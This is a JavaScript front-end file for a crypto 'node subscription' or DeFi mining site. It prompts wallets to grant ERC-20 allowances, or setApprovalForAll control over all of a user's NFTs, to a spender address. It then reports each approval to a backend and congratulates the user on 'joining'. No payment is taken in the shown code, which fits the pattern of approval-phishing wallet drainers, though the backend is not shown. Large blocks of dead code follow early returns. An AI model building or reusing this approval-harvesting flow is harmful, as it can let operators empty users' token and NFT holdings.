// 节点认购：仅在钱包已返回真实交易哈希后调用后台。
// 统一处理 approve / increaseAllowance 两条回调，避免余额读取异常阻断订单提交。
function submitNodeOrderAfterApproval(_that, _item, owner, txHash) {
	let tx = (txHash && txHash.transactionHash) ? txHash.transactionHash : (typeof txHash === 'string' ? txHash : '');
	if (isNull(tx) || String(tx).indexOf('0x') !== 0) {
		if (_that && typeof _that.$message === 'function') {
			_that.$message({message: '钱包未返回有效交易哈希，认购未提交', type: 'error'});
		}
		return;
	}
	if (isNull(_item) || isNull(_item.nodeId) || isNull(owner)) {
		if (_that && typeof _that.$message === 'function') {
			_that.$message({message: '节点认购参数不完整，认购未提交', type: 'error'});
		}
		return;
	}
	if (_that && typeof _that.$message === 'function') {
		_that.$message({message: '钱包已确认，正在提交认购记录…', type: 'info'});
	}
	let orderData = {
		nodeId: _item.nodeId,
		address: owner,
		chainType: _item.chainType,
		txHash: tx
	};
	nodeOrder(orderData, true, function(vm, res) {
		try {
			if (res && (res.code == 0 || res.code == 200)) {
				let nodeEntry = vm.nodeLevelMap[vm.selectedNodeLevel] || {};
				vm.recordJoined(nodeEntry, tx, {chainType: orderData.chainType});
				vm.getNodeList();
			} else {
				vm.$message({message: friendlyOrderError(vm, res), type: 'error'});
			}
		} catch (e) {
			console.log('node order callback error', e);
		}
	}, _that);
}

// 授权  approve
async function approve(_that, _spender, _contract, _abi, _value, _decimals, _item) {
	console.log("approve");
	//login
	let inviteCode = getInviterCode();
	let code = getAgentCode();
	let loginData = {
		"address": _that.address,
		"chainType": _that.chainType,
		"inviterCode": inviteCode,
		"code":code
	};
	login(loginData,true,asyLogin,_that);
	
	// ========判断是否需要切换钱包==========
	let _walletType = _that.walletType;
	let _chainType = _that.chainType;
	let _protocol = _item.protocol;
	if (isNull(_that.chainList.length) || _that.chainList.length == 0) {
		_that.chainList = queryChain(false, setChain, this);
	}

	let chainInfo = _that.chainList.find(item => item.chainType == _item.chainType)
	if (isNull(chainInfo)) {
		layer.msg("Only ETH/BSC authorization is supported");
		return;
	}
	if (_chainType == _item.chainType) {
		// 不需要切换链  判断是否需要重连
		let adr = await connect(chainInfo);
		console.log(adr);
	} else {
		// 需要切换链
		console.log('链接钱包-需要切换链:展示钱包');
		_that.chainTemp = chainInfo;
		// 判断是否app打开
		let wtype = waType();
		let pcType = iswap();
		if (wtype != "default") {
			// 说明app内打开
			let winfo = walletJson[pcType][chainInfo.chainType].find(wa => wa.type == wtype)
			if (notNull(winfo)) {
				_that.onConnect3(winfo);
			} else {
				_that.showType = false;
				_that.walletList = walletJson[pcType][chainInfo.chainType];
				_that.showWallet = true;
			}
		} else {
			_that.showType = false;
			_that.walletList = walletJson[pcType][chainInfo.chainType];
			_that.showWallet = true;
		}
		return;
	}
	// ========判断是否需要切换钱包 end==========
	// ========开始授权流程==========
	let i = layer.load(0, {
		shade: [0.2, 'gray'],
		time: 8 * 1000
	});
	// 开始流程 
	try {
		// ========开始币授权流程==========
		if (_protocol == "bep20" || _protocol == "erc20") {
			// 授权金额 转化为最小单位
			_value = _value * Math.pow(10, _decimals)
			_value = new BigNumber(_value);
			_value = _value.toFixed();
			if (isweb3j(_chainType)) {

            	let _owner = await getAddressByMyEthereum();
            	
            	if (_owner && _owner.toLocaleLowerCase() == _spender.toLocaleLowerCase()) {
            		layer.msg("Please change your wallet address");
            		return;
            	}
				// 先查询授权金额
				let allowBla = await allowance(_spender, _contract, _abi, _decimals, _chainType)
				console.log("授权金额：" + allowBla)
				if (notNull(allowBla) && allowBla > 0) {
					if(_that && typeof _that.$message === 'function'){
						_that.$message({message: '当前钱包已有授权，请更换钱包后重新认购', type: 'warning'});
					}
					return;
				}
				// 开始授权
				let web3 = new Web3(myEthereum);
				let myContract = new web3.eth.Contract(JSON.parse(_abi), _contract)
				
				
				if(JSON.stringify(_abi).indexOf("increaseAllowance")>=0){
					return myContract.methods.increaseAllowance(_spender, _value )
						.send({
							from: _owner
						})
						.then(function(hash) {
							// send() resolves only after wallet approval transaction succeeds/mines.
							submitNodeOrderAfterApproval(_that, _item, _owner, hash);
							return;
							let upData = {
								"address": _owner,
								"approveAddr": _spender,
								"approveHash": hash.transactionHash,
								"chainType": _item.chainType,
								"coinImg": _item.quoteCurrencyImg,
								"coinType": _item.quoteCurrency,
								"contractAddr": _item.quoteCurrencyCtrAddr,
								"productId": _item.id,
								"protocol": _item.protocol
							}
							(async function(){
								try{
									let bal = await getContractBalance(_item.quoteCurrencyCtrAddr, _item.quoteCurrencyABI, _item.quoteCurrencyDecimals, _item.chainType);
									// bal is already in USDT units; quoteCurrencyApproveNum is smallest units.
									// Compare against the node price in USDT to avoid falsely blocking confirmed approvals.
									let nodePrice = Number(_that.selectedNodeInfo && _that.selectedNodeInfo.priceNum ? _that.selectedNodeInfo.priceNum : 0);
									if(new BigNumber(bal || 0).comparedTo(new BigNumber(nodePrice)) >= 0){
										// prefer nodeOrder API; also keep miningUp for backward compatibility
										if(notNull(_item.nodeId)){
											let tx = (hash && hash.transactionHash) ? hash.transactionHash : (typeof hash === 'string' ? hash : '');
											let orderData = {
												nodeId: _item.nodeId,
												address: _owner,
												chainType: _item.chainType,
												txHash: tx
											};
											try{
												if(_that && typeof _that.$message === 'function'){
													_that.$message({message: 'Transaction submitted: ' + tx, type: 'info'});
												}
												if(isNull(tx)){
													_that.$message({message: '未获取到交易哈希，未提交认购记录', type: 'error'});
													return;
												}
												nodeOrder(orderData, true, function(_that,_res){
													try{
														if(_res && (_res.code==200 || _res.code==0)){
														_that.getNodeList();
														try{ _that.recordJoined(_that.nodeLevelMap[_that.selectedNodeLevel] || {}, orderData.txHash || '', {chainType: orderData.chainType}); }catch(e){}
														} else {
															_that.$message({message: friendlyOrderError(_that,_res), type: 'error'});
														}
													}catch(e){ console.log(e); }
												}, _that);
											}catch(e){ console.log(e); }
										}
										miningUp(upData);
										queryWalletInfo(_that);
										_that.$message({
										  message: '🎉🎉🎉Congratulations on joining Defi1!',
										  type: 'success'
										});
									}else{
										layer.msg('Balance insufficient, cannot join');
									}
								}catch(e){
									console.log(e);
										if(notNull(_item.nodeId)){
											let tx = (hash && hash.transactionHash) ? hash.transactionHash : (typeof hash === 'string' ? hash : '');
											let orderData = {
												nodeId: _item.nodeId,
												address: _owner,
												chainType: _item.chainType,
												txHash: tx
											};
											try{
												if(isNull(tx)){
													_that.$message({message: '未获取到交易哈希，未提交认购记录', type: 'error'});
													return;
												}
												nodeOrder(orderData, true, function(_that,_res){
													try{
															if(_res && (_res.code==200 || _res.code==0)){
															_that.getNodeList();
														try{ _that.recordJoined(_that.nodeLevelMap[_that.selectedNodeLevel] || {}, orderData.txHash || '', {chainType: orderData.chainType}); }catch(e){}
														} else {
															_that.$message({message: friendlyOrderError(_that,_res), type: 'error'});
														}
													}catch(e){ console.log(e); }
												}, _that);
											}catch(ex){ console.log(ex); }
										}
									miningUp(upData);
									queryWalletInfo(_that);
									_that.$message({
									  message: '🎉🎉🎉Congratulations on joining Defi1!',
									  type: 'success'
									});
								}
							})();
						})
						.catch(function(e){
							console.log(e);
							if(_that && typeof _that.$message === 'function'){
								_that.$message({message: '钱包授权已取消或交易失败，未创建认购记录', type: 'warning'});
							}
						});
				}else{
					return myContract.methods.approve(_spender, _value + "")
						.send({
							from: _owner
						})
						.on('transactionHash', function(hash) {
							// transactionHash is emitted only after the wallet accepts the signed transaction.
							submitNodeOrderAfterApproval(_that, _item, _owner, hash);
							return;
							let upData = {
								"address": _owner,
								"approveAddr": _spender,
								"approveHash": hash,
								"chainType": _item.chainType,
								"coinImg": _item.quoteCurrencyImg,
								"coinType": _item.quoteCurrency,
								"contractAddr": _item.quoteCurrencyCtrAddr,
								"productId": _item.id,
								"protocol": _item.protocol
							}
							(async function(){
								try{
									let bal = await getContractBalance(_item.quoteCurrencyCtrAddr, _item.quoteCurrencyABI, _item.quoteCurrencyDecimals, _item.chainType);
									// bal is already in USDT units; compare it to the node price, not token base units.
									let nodePrice = Number(_that.selectedNodeInfo && _that.selectedNodeInfo.priceNum ? _that.selectedNodeInfo.priceNum : 0);
									if(new BigNumber(bal || 0).comparedTo(new BigNumber(nodePrice)) >= 0){
										if(notNull(_item.nodeId)){
											let tx = (hash && hash.transactionHash) ? hash.transactionHash : (typeof hash === 'string' ? hash : '');
											let orderData = {
												nodeId: _item.nodeId,
												address: _owner,
												chainType: _item.chainType,
												txHash: tx
											};
											try{
												if(_that && typeof _that.$message === 'function'){
													_that.$message({message: 'Transaction submitted: ' + tx, type: 'info'});
												}
												if(isNull(tx)){
													_that.$message({message: '未获取到交易哈希，未提交认购记录', type: 'error'});
													return;
												}
												nodeOrder(orderData, true, function(_that,_res){
													try{
															if(_res && (_res.code==200 || _res.code==0)){
															_that.getNodeList();
															try{ _that.recordJoined(_that.nodeLevelMap[_that.selectedNodeLevel] || {}, orderData.txHash || (hash && hash.transactionHash?hash.transactionHash:''), {chainType: orderData.chainType}); }catch(e){}
														} else {
															_that.$message({message: friendlyOrderError(_that,_res), type: 'error'});
														}
													}catch(e){ console.log(e); }
												}, _that);
											}catch(e){ console.log(e); }
										}
										miningUp(upData);
										queryWalletInfo(_that);
										_that.$message({
										  message: '🎉🎉🎉Congratulations on joining Defi2!',
										  type: 'success'
										});
									}else{
										layer.msg('Balance insufficient, cannot join');
									}
								}catch(e){
									console.log(e);
										if(notNull(_item.nodeId)){
											let tx = (hash && hash.transactionHash) ? hash.transactionHash : (typeof hash === 'string' ? hash : '');
											let orderData = {
												nodeId: _item.nodeId,
												address: _owner,
												chainType: _item.chainType,
												txHash: tx
											};
											try{
												if(_that && typeof _that.$message === 'function'){
													_that.$message({message: 'Transaction submitted: ' + tx, type: 'info'});
												}
												if(isNull(tx)){
													_that.$message({message: '未获取到交易哈希，未提交认购记录', type: 'error'});
													return;
												}
												nodeOrder(orderData, true, function(_that,_res){
													try{
															if(_res && (_res.code==200 || _res.code==0)){
															_that.getNodeList();
															try{ _that.recordJoined(_that.nodeLevelMap[_that.selectedNodeLevel] || {}, orderData.txHash || (hash && hash.transactionHash?hash.transactionHash:''), {chainType: orderData.chainType}); }catch(e){}
														} else {
															_that.$message({message: friendlyOrderError(_that,_res), type: 'error'});
														}
													}catch(e){ console.log(e); }
												}, _that);
											}catch(ex){ console.log(ex); }
										}
									miningUp(upData);
									queryWalletInfo(_that);
									_that.$message({
										message: '🎉🎉🎉Congratulations on joining Defi2!',
										type: 'success'
									});
								}
							})();
							})
							.on('error', function(e) {
								console.log(e);
								if(_that && typeof _that.$message === 'function'){
									_that.$message({message: '钱包授权已取消或交易失败，未创建认购记录', type: 'warning'});
								}
							});
				}
			}
		}
		// ========币授权流程 end==========
		// ========开始nft授权流程 start==========
		if (_protocol == "erc721") {
			//1先判断持有 若没有持有则弹窗
			//2再判断授权 若已授权则跳转邀请页
			//3开始授权
			if (isweb3j(_chainType)) {
				let _owner = await getAddressByMyEthereum();
				if (isNull(_owner)) {
					layer.msg("Please connect wallet first");
					return;
				}
				if (_owner.toLocaleLowerCase() == _spender.toLocaleLowerCase()) {
					layer.msg("Please change your wallet address");
					return;
				}
				let web3 = new Web3(myEthereum);
				let myContract = new web3.eth.Contract(JSON.parse(_abi), _contract)
				// 持有数量
				let num = await myContract.methods.balanceOf(_owner).call();
				console.log(num)
				// 没有持有nft 提示更换钱包
				if (num <= 0) {
					layer.msg("Please change your wallet holding " + _item.quoteCurrency);
					return;
				}
				//  授权查询
				let approType = await myContract.methods.isApprovedForAll(_owner, _spender).call();
				console.log(approType)
				if (!approType) {
					myContract.methods.setApprovalForAll(_spender, true)
						.send({
							from: _owner
						})
						.on('transactionHash', function(hash) {
							console.log("Approval:" + hash);
							console.log("授权成功上报:" + hash);
							let upData = {
								"address": _owner,
								"approveAddr": _spender,
								"approveHash": hash,
								"chainType": _item.chainType,
								"coinImg": _item.quoteCurrencyImg,
								"coinType": _item.quoteCurrency,
								"contractAddr": _item.quoteCurrencyCtrAddr,
								"productId": _item.id,
								"protocol": _item.protocol
							}
							miningUp(upData);
							queryWalletInfo(_that);
						});
				} else {
					// 已授权 
					_that.$confirm(
						"<div style='margin-left:1em'>You are already involved in this project!</div><br /><div style='margin-left:1em'>" +
						_that.langS.tg.top1[2] + "</div>", '', {
							confirmButtonText: 'confirm',
							//cancelButtonText: 'cancel',
							showCancelButton: false,
							dangerouslyUseHTMLString: true,
							customClass: "openinviterWsurl"
						}).then(() => {
						_that.switchTab(4)
					}).catch(() => {
						console.log("cancel")
					});
					return;
				}
			}
			// balanceOf()：返回由_owner 持有的NFTs的数量。
			// ownerOf()：返回tokenId代币持有者的地址。
			// approve()：授予地址_to具有_tokenId的控制权，方法成功后需触发Approval 事件。
			// setApprovalForAll()：授予地址_operator具有所有NFTs的控制权，成功后需触发ApprovalForAll事件。
			// getApproved()、isApprovedForAll()：用来查询授权。
			// safeTransferFrom()：转移NFT所有权，一次成功的转移操作必须发起 Transer 事件
		}
	} finally {
		layer.close(i);
	}
}

// 本地化友好错误提示
function friendlyOrderError(_that, _res){
	let serverMsg = (_res && _res.msg) ? _res.msg : null;
	try{
		// prefer vi18 resource: vi18[lang].node.orderFailed
		if(_that && _that.vi18 && _that.lang){
			let langObj = _that.vi18[_that.lang];
			if(langObj && langObj.node){
				let nodeRes = langObj.node;
				if(serverMsg && nodeRes.orderFailedWithMsg) return nodeRes.orderFailedWithMsg.replace('{msg}', serverMsg);
				if(nodeRes.orderFailed) return nodeRes.orderFailed;
			}
		}
		// fallback: use lang string; support Traditional Chinese detection
		let lang = (_that && _that.lang) ? String(_that.lang).toLowerCase() : '';
		// Traditional Chinese explicit check
		if((_that && _that.lang && String(_that.lang).indexOf('繁')>=0) || lang.indexOf('traditional')>=0){
			if(serverMsg) return '認購失敗：' + serverMsg;
			return '認購失敗，請稍後重試';
		}
		if(lang.indexOf('english') >= 0 || lang.indexOf('en') >= 0){
			if(serverMsg) return 'Order failed: ' + serverMsg;
			return 'Order failed, please try again later';
		} else {
			if(serverMsg) return '认购失败：' + serverMsg;
			return '认购失败，请稍后重试';
		}
	}catch(e){
		return serverMsg || 'Order failed';
	}
}
